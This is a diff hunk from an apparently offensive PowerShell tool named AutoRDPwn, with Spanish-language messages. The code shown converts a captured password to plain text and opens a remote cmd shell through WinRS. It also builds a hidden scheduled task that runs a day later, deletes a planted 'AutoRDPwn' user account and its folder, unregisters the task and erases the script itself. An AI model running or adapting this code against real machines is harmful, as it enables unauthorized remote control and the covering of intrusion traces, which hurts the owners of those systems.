@@ -282,7 +282,7 @@ $session = get-pssession ; Write-Host "" ; if ($session){ Write-Host "Iniciando 
 $PlainTextPassword = ConvertFrom-SecureToPlain $password
 if ($console){ Clear-Host ; Write-Host '>> Consola semi-interactiva en equipo remoto <<' ; Write-Host "" ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
 else { Write-Host "Algo salió mal, cerrando el programa.." -ForegroundColor Red ; sleep -milliseconds 3000 }
-if ($hash){ invoke-command -session $RDP[0] -scriptblock { $script = '$AutoRDPwn = ls C:\Users AutoRDPwn* | %{Write-Output $_.Name}'
+if ($hash){ invoke-command -session $RDP[0] -scriptblock { $script = Write-Output '$AutoRDPwn = ls C:\Users AutoRDPwn* | %{Write-Output $_.Name}' | iex
 $script2 = 'net user AutoRDPwn /delete ; cmd.exe /c rd /s /q $AutoRDPwn ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false ; $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript'
 echo $script > $env:TEMP\script.ps1 ; echo $script2 >> $env:TEMP\script.ps1 ; $file = "$env:TEMP\script.ps1"
 $action = New-ScheduledTaskAction -Execute powershell -Argument "-NoProfile -WindowStyle Hidden $file" ; $time = (Get-Date).AddDays(+1) ; $trigger =  New-ScheduledTaskTrigger -Once -At $time
